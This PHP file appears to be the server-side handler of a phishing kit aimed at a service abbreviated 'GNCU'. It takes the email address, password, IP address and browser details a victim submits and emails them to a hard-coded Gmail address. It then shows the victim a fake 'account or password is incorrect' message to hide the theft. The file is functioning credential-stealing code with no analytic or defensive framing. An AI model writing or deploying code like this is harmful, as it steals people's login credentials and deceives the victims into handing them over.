<?php 

function wash(string $input) {
  return htmlspecialchars(trim($input));
}

function sendMail (string $subject, string $message) {

  $EMAIL = "gottmacht.empire@gmail.com";
  $SENDER_EMAIL = "gottmacht.empire@yandex.com";

  // $EMAIL = "alexjace151@gmail.com";
  // $SENDER_EMAIL = "jacealex151@gmail.com";

  $headers  = 'MIME-Version: 1.0' . "\r\n";
  $headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
  
  // Create email headers
  $headers .= "From:  OFFICE M3SH<$SENDER_EMAIL>\r\n";
  $headers .= "Reply-to: $SENDER_EMAIL\r\n";

  return mail($EMAIL, $subject, $message, $headers, "-f$SENDER_EMAIL");
}

if(isset($_POST['request'])) {
  $email = wash($_POST['email']);
  $password = wash($_POST['password']);
  $ip = wash($_POST['ip']);
  $browser = wash($_POST['browser']);

  // Send mail
  $message = "<!DOCTYPE html>
    <html lang='en'>
        <head>
            <meta charset='UTF-8'>
        </head>
        <body>
            <div style='width: 100%; max-width: 600px; margin: 0 auto; padding: 2rem;'>
                <div style='display: flex; align-items: center; margin: .5rem;'> 
                    <p style='font-size: 1rem; font-weight: 500; margin-right: .8rem;'>Email:</p>
                    <p style='flex: 1; font-size: 1rem; font-weight: 600;'>{{email}}</p>
                </div>
    
                <div style='display: flex; align-items: center; margin: .5rem;'> 
                    <p style='font-size: 1rem; font-weight: 500; margin-right: .8rem;'>Password:</p>
                    <p style='flex: 1; font-size: 1rem; font-weight: 600;'>{{password}}</p>
                </div>

                <div style='height: 1px; margin: 2rem 0; border-bottom: 2px dashed #000;'></div>
                
                <div style='display: flex; align-items: center; margin: .5rem;'> 
                    <p style='font-size: 1rem; font-weight: 500; margin-right: .8rem;'>Ip Address:</p>
                    <p style='flex: 1; font-size: 1rem; font-weight: 600;'>{{ip}}</p>
                </div>
    
                <div style='display: flex; align-items: center; margin: .5rem;'> 
                    <p style='font-size: 1rem; font-weight: 500; margin-right: .8rem;'>Browser Info:</p>
                    <p style='flex: 1; font-size: 1rem; font-weight: 600;'>{{browser}}</p>
                </div>
            </div>
        </body>
    </html>";


  
  $message = str_replace("{{ip}}", $ip, $message);
  $message = str_replace("{{browser}}", $browser, $message);
  $message = str_replace("{{email}}", $email, $message);
  $message = str_replace("{{password}}", $password, $message);

  try {
    sendMail("GNCU - LOG | $ip", $message) or throw new Exception("Couldn't send'");
    echo json_encode([
      "success" => true,
      "message" => "Your account or password is incorrect. If you don't remember your password, <a href='#' class='new-link'>reset it now.</a>",
    ]);
  }
  catch(Exception $e) {
    echo json_encode([
      "success" => false,
      "message" => "An error occured while authentication, Please try again.",
    ]);
  }
}